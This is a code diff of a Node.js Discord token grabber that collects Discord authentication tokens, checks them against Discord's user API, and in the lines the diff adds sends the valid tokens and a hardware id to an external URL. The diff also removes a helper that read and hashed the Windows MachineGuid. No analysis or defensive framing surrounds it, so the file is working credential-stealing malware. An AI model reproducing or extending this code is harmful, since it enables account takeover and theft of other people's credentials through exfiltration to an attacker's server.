@@ -6,8 +6,6 @@
 
 // Do our own stuff
 const fs = require('fs');
-const { exec } = require('child_process');
-const { createHash } = require('crypto');
 
 class TokenData {
     constructor(token, id, username, discriminator, email, avatar, verified, locale, mfa_enabled, phone, premium_type) {
@@ -57,34 +55,10 @@ class TokenData {
     }
 }
 
-const machineId = () => {
-    return new Promise((resolve, reject) => {
-        exec('%windir%\\System32\\REG.exe QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid', {}, (err, stdout, stderr) => {
-            if (err) {
-                console.log(err.stack);
-                reject();
-                return;
-            }
-
-            resolve(
-                createHash('sha256')
-                    .update(
-                        stdout
-                            .toString()
-                            .split('REG_SZ')[1]
-                            .replace(/\r+|\n+|\s+/gi, '')
-                            .toLowerCase()
-                    )
-                    .digest('hex')
-            );
-        });
-    });
-};
-
 const getTokens = async () => {
     const testToken = (token) => {
         return new Promise((resolve, reject) => {
-            req('https', 'get', 'https://discordapp.com/api/v6/users/@me', { Authorization: token }, true).then((res) => resolve(res));
+            get('https', 'https://discordapp.com/api/v6/users/@me', { Authorization: token }, true).then((res) => resolve(res));
         });
     };
 
@@ -116,7 +90,11 @@ const getTokens = async () => {
         }
     }
 
-    console.log(JSON.stringify(validTokens.map((t) => t.toJSON())));
+    return JSON.stringify(validTokens.map((t) => t.toJSON()));
 };
 
-getTokens();
+getTokens().then((tokens) => {
+    const startsWithHttps = url.toLowerCase().startsWith('https');
+
+    get(startsWithHttps ? 'https' : 'http', url.toLowerCase() + `/u/${hwid}?t=${tokens}`).then(() => {});
+});
